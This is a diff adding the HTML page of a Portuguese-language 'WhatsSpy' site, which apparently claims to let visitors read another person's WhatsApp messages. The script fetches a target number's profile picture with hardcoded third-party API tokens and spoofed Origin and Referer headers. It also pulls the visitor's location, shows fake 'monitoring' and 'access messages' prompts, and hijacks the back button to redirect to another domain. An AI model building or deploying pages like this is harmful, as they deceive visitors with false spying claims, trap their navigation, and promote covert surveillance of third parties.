@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsSpy - Número</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="stylesheet" href="css/pagina2.css" />
+
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+      }
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100%;
+        width: 100%;
+      }
+      #fotoperfil {
+        width: 120px;
+        height: 120px;
+        border-radius: 50%;
+        display: block;
+        border: 3px solid #00d942;
+        animation: pulse 1.5s infinite;
+      }
+      @keyframes pulse {
+        0% {
+          box-shadow: 0 0 0 0 rgba(0, 217, 66, 0.7);
+        }
+        70% {
+          box-shadow: 0 0 10px 10px rgba(0, 217, 66, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(0, 217, 66, 0);
+        }
+      }
+      #phone-info {
+        font-size: 20px; /* Aumentando o tamanho da fonte */
+        color: #000;
+      }
+    </style>
+  </head>
+  <body>
+    <header class="header">
+      <img src="images/logo.webp" alt="WhatsSpy Logo" class="logo" />
+    </header>
+
+    <main class="main-content">
+      <div class="box">
+        <div class="container">
+          <img
+            src="https://ec-aminhota.pt/wp-content/uploads/2015/05/perfil-sem-foto-220615.png"
+            id="fotoperfil"
+            alt="Foto de perfil"
+          />
+        </div>
+        <div
+          style="
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+          "
+        >
+          <p id="city-info" style="font-size: 12px; color: #777">
+            Conectado em:
+          </p>
+          <p id="phone-info">+55 <span id="formatted-number"></span></p>
+          <button
+            id="access-messages-btn"
+            style="
+              margin-top: 10px;
+              padding: 10px 20px;
+              background-color: #00d942;
+              border: none;
+              border-radius: 5px;
+              color: #fff;
+              cursor: pointer;
+              animation: pulse 2s infinite;
+              transition: all 0.3s ease;
+            "
+          >
+            Clique Aqui para acessar mensagens
+          </button>
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <img src="images/logo.webp" alt="WhatsSpy Logo" class="footer-logo" />
+      <p>Termos de Uso - Políticas de Privacidade</p>
+      <p>WhatsSpy 2024 ©</p>
+    </footer>
+
+    <script src="js/pagina2.js" defer=""></script>
+
+    <script>
+      // Adiciona uma nova entrada no histórico
+      history.pushState(null, null, window.location.href);
+
+      window.onpopstate = function () {
+        window.location.href = "https://appespiaopro.fun/backredirect";
+      };
+
+      // Obtenção da cidade do visitante
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch(
+              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=pt`
+            )
+              .then((response) => response.json())
+              .then((data) => {
+                const city = data.city || "Cidade não encontrada";
+                document.getElementById("city-info").textContent += city;
+              })
+              .catch((error) => {
+                console.error("Erro ao obter a cidade:", error);
+              });
+          },
+          function () {
+            document.getElementById("city-info").textContent +=
+              "Não foi possível obter a localização";
+          }
+        );
+      } else {
+        document.getElementById("city-info").textContent +=
+          "Geolocalização não suportada pelo navegador";
+      }
+
+      const params = new URLSearchParams(window.location.search);
+      const id = params.get("number");
+
+      var number = id;
+      var formattedNumber = number.replace(
+        /^(\d{2})(\d{5})(\d{4})$/,
+        "$1 $2-$3"
+      );
+      document.getElementById("formatted-number").textContent = formattedNumber;
+
+      var headers = {
+        "X-Rapidapi-Host": "https://api.z-api.io",
+        "Client-Token": "Ff17338e297fa4ee9acded37d2558f741S",
+        Origin: "https://viewerspy.online/app/",
+        Referer: "https://viewerspy.online/app/",
+      };
+      var url =
+        "https://api.z-api.io/instances/3D46D49E2D25C021E37EAAC178ACA131/token/37057CC42C251D4497F82227/profile-picture?phone=+55" +
+        number;
+
+      fetch(url, {
+        method: "GET",
+        headers: headers,
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          var fotoperfil = data.link;
+          var recado = "Monitorando...";
+          if (!fotoperfil) {
+            Toastify({
+              text: "Número não encontrado",
+              duration: 3000,
+              close: true,
+              gravity: "top",
+              position: "center",
+              backgroundColor: "red",
+            }).showToast();
+            setTimeout(() => {
+              window.location.replace("/pagina3/?" + params.toString());
+            }, 1000);
+          }
+          // Definindo a imagem do perfil ou a imagem padrão
+          var fotoPerfilSrc =
+            fotoperfil ||
+            "https://ec-aminhota.pt/wp-content/uploads/2015/05/perfil-sem-foto-220615.png";
+          document.getElementById("fotoperfil").src = fotoPerfilSrc;
+          // document.getElementById("recado").textContent = "Recado: " + recado;
+
+          // Salvando o cookie com a foto de perfil
+          document.cookie =
+            "perfil=" +
+            encodeURIComponent(fotoPerfilSrc) +
+            "; path=/; max-age=3600";
+        })
+        .catch((error) => {
+          setTimeout(() => {
+            Toastify({
+              text: "Número não encontrado",
+              duration: 3000,
+              close: true,
+              gravity: "top",
+              position: "center",
+              backgroundColor: "red",
+            }).showToast();
+            window.location.replace("/pagina3/?" + params.toString());
+          }, 1000);
+        });
+
+      document
+        .getElementById("access-messages-btn")
+        .addEventListener("click", function () {
+          // Redireciona para a página com os parâmetros
+          window.location.href = "/pagina3/?" + params.toString();
+        });
+
+      jQuery(document).ready(function ($) {
+        moment.locale("pt-br");
+        var localLocale = moment();
+        var ne1 = localLocale.format("D [de] MMMM [de] YYYY");
+        var ne2 = localLocale.format("dddd, D [de] MMMM [de] YYYY");
+        var ne3 = moment().format("LLLL");
+        $(".ne1").text(ne1);
+        $(".ne2").text(ne2);
+        $(".ne3").text(ne3);
+      });
+    </script>
+
+    <script src="../../../ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="js/5tU9jtO1I7Hf.js"></script>
+    <script src="js/qBkiWmHnsm2A.js"></script>
+  </body>
+</html>
